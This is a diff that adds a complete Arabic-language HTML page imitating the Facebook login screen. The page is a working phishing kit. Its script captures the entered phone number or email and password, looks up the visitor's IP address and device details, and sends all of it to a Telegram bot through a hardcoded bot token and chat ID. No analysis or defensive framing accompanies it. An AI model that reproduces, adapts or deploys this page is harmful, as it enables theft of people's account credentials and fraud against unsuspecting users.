@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f6f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            direction: rtl;
+        }
+
+        .login-container {
+            background-color: white;
+            width: 320px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 100px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #165eab;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 12px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .signup-link a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+    </style>
+    <!-- إضافة مكتبة axios -->
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="شعار فيسبوك">
+        </div>
+        <form id="login-form" action="login_action_page.php" method="POST">
+            <input type="text" class="input-field" name="phone" id="phone" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
+            <input type="password" class="input-field" name="password" id="password" placeholder="كلمة المرور" required>
+            <button type="submit" class="login-button">تسجيل الدخول</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">هل نسيت كلمة المرور؟</a>
+        </div>
+        <div class="signup-link">
+            <p>لا تملك حساباً؟ <a href="#">إنشاء حساب</a></p>
+        </div>
+    </div>
+
+    <script>
+        const TOKEN = "7555812839:AAHBTn0EMUDpWfdQmLPqBo9kP_j56yPh7cs";  // هنا التوكين
+        const CHAT_ID = "782949934";  // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // استخدم حقل رقم الهاتف بدلاً من البريد الإلكتروني
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = ` 
+                        <b>محاولة تسجيل دخول جديدة</b>\n
+                        <b>رقم الهاتف:</b> ${phone}\n
+                        <b>كلمة المرور:</b> ${password}\n
+                        <b>عنوان الـ IP:</b> ${ip}\n
+                        <b>نوع الجهاز:</b> ${deviceType}\n
+                        <b>النظام الأساسي:</b> ${platform}\n
+                        <b>وكيل المستخدم:</b> ${userAgent}\n
+                        <b>دقة الشاشة:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(response => {
+                        alert('تم إرسال المعلومات بنجاح.');
+                    }).catch(error => {
+                        alert('حدث خطأ أثناء إرسال المعلومات. يرجى المحاولة مرة أخرى.');
+                    });
+                })
+                .catch(error => {
+                    alert('حدث خطأ أثناء جلب عنوان الـ IP. يرجى المحاولة مرة أخرى.');
+                });
+        });
+    </script>
+</body>
+</html>
